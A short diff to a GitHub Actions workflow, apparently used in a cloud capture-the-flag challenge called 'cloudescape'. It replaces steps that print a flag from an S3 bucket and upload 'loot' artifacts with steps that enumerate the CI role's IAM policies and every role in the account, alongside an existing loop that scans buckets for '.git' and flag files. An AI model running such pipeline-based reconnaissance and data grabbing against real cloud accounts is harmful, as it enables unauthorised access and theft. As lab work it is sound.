@@ -32,13 +32,10 @@ jobs:
             aws s3 ls "s3://$b/" --recursive 2>/dev/null | grep -iE '\.git/|flag' || echo "  (nothing matched)"
           done
 
-      - name: Print the flag
-        run: aws s3 cp "s3://codec4f26c862a321ef5/flag.txt" -
-      - name: Upload loot
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: cloudescape-loot
-          path: loot-*/**
-          if-no-files-found: ignore
-          retention-days: 1
+      - name: Enumerate roles & policies
+        run: |
+          echo "---- my attached policies ----"
+          aws iam list-attached-role-policies --role-name cicdRole 2>/dev/null || echo "denied"
+          aws iam list-role-policies --role-name cicdRole 2>/dev/null || echo "denied"
+          echo "---- roles in account ----"
+          aws iam list-roles --query 'Roles[].[RoleName,Arn]' --output text 2>/dev/null || echo "denied"
